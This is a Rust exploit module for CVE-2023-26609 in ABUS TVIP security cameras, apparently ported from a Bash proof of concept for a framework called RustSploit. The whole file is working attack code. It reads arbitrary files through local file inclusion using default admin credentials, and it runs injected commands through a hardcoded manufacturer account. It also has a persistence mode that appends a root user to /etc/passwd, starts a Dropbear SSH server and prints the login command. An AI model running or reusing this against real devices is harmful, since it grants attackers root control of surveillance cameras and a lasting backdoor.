// Exploit Title: ABUS Security Camera TVIP 20000-21150 - LFI, RCE and SSH Root Access
// CVE: CVE-2023-26609
// Author: d1g@segfault.net | Ported to Rust for RustSploit
// PoC converted 1:1 from Bash to async Rust logic

use anyhow::{Result, anyhow};
use reqwest::Client;
use std::io::{self, Write};

/// // Send authenticated LFI request
async fn exploit_lfi(client: &Client, target: &str, filepath: &str) -> Result<()> {
    // // ABUS Security Camera LFI
    let url = format!(
        "http://admin:admin@{}/cgi-bin/admin/fileread?READ.filePath={}",
        target, filepath
    );
    println!("[*] Sending LFI request to: {}", url);

    let resp = client.get(&url).send().await?;
    let status = resp.status();
    let body = resp.text().await?;

    println!("[+] Status: {}", status);
    println!("[+] Body:\n{}", body);

    Ok(())
}

/// // Send authenticated RCE request with command injection
async fn exploit_rce(client: &Client, target: &str, cmd: &str) -> Result<()> {
    // // ABUS Security Camera RCE
    let url = format!(
        "http://manufacture:erutcafunam@{}/cgi-bin/mft/wireless_mft?ap=testname;{}",
        target, cmd
    );
    println!("[*] Sending RCE request to: {}", url);

    let resp = client.get(&url).send().await?;
    let status = resp.status();
    let body = resp.text().await?;

    println!("[+] Status: {}", status);
    println!("[+] Body:\n{}", body);

    Ok(())
}

/// // Stage 1: Generate SSH key
async fn generate_ssh_key(client: &Client, target: &str) -> Result<()> {
    // // /etc/dropbear/dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
    let cmd = "/etc/dropbear/dropbearkey%20-t%20rsa%20-f%20/etc/dropbear/dropbear_rsa_host_key";
    println!("[*] Generating SSH key on target...");
    exploit_rce(client, target, cmd).await
}

/// // Stage 2: Add root user with known password hash
async fn inject_root_user(client: &Client, target: &str) -> Result<()> {
    // // echo d1g:OmE2EUpLJafIk:0:0:root:/:/bin/sh >> /etc/passwd
    let cmd = "echo%20d1g:OmE2EUpLJafIk:0:0:root:/:/bin/sh%20>>%20/etc/passwd";
    println!("[*] Injecting root user into /etc/passwd...");
    exploit_rce(client, target, cmd).await
}

/// // Stage 3: Start Dropbear SSH server
async fn start_dropbear(client: &Client, target: &str) -> Result<()> {
    // // /etc/dropbear/dropbear -E -F
    let cmd = "/etc/dropbear/dropbear%20-E%20-F";
    println!("[*] Starting Dropbear SSH server...");
    exploit_rce(client, target, cmd).await
}

/// // Combined SSH persistence exploit
async fn persist_root_shell(client: &Client, target: &str) -> Result<()> {
    generate_ssh_key(client, target).await?;
    inject_root_user(client, target).await?;
    start_dropbear(client, target).await?;
    println!("[+] Persistence complete! Try logging in:");
    println!("    sshpass -p <PASSWORD> ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa d1g@{}", target);
    Ok(())
}

/// // Prompt user for LFI, RCE, or SSH and execute accordingly
async fn execute(target: &str) -> Result<()> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    println!("[*] Exploit mode selection for target: {}", target);
    println!("[1] LFI");
    println!("[2] RCE");
    println!("[3] SSH Persistence");
    print!("> ");
    io::stdout().flush()?;

    let mut choice = String::new();
    io::stdin().read_line(&mut choice)?;
    let choice = choice.trim();

    match choice {
        "1" => {
            print!("Enter file path to read (e.g. /etc/passwd): ");
            io::stdout().flush()?;
            let mut filepath = String::new();
            io::stdin().read_line(&mut filepath)?;
            exploit_lfi(&client, target, filepath.trim()).await?;
        }
        "2" => {
            print!("Enter command to execute (e.g. id): ");
            io::stdout().flush()?;
            let mut command = String::new();
            io::stdin().read_line(&mut command)?;
            exploit_rce(&client, target, command.trim()).await?;
        }
        "3" => {
            persist_root_shell(&client, target).await?;
        }
        _ => return Err(anyhow!("Invalid choice")),
    }

    Ok(())
}

/// // Entry point for the exploit module used by the dispatch system
pub async fn run(target: &str) -> Result<()> {
    execute(target).await
}
